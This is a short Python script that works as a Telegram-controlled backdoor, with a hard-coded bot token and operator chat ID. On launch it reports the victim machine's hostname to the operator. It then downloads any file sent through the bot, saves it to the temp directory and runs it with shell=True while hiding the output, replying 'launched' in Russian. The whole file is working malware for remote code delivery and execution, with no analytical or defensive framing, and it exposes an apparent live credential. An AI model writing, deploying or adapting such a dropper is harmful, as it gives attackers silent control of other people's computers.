import telebot
import subprocess
import os
import platform
import tempfile

TOKEN = '7042741460:AAGOcMu-h--ztYI-IvzW-3NzAvTySeQonK4'
CHAT_ID = '1320544591'
bot = telebot.TeleBot(TOKEN)

system_name = platform.node()
bot.send_message(CHAT_ID, f'connect! [{system_name}]')

@bot.message_handler(content_types=['document'])
def handle_document(message):
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        temp_dir = tempfile.gettempdir()
        temp_file_path = os.path.join(temp_dir, message.document.file_name)

        with open(temp_file_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        subprocess.Popen(temp_file_path, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        bot.reply_to(message, f'Запущено: {message.document.file_name}')
    except Exception as e:
        bot.reply_to(message, f'Ошибка запуска: {str(e)}')

bot.polling(none_stop=True)
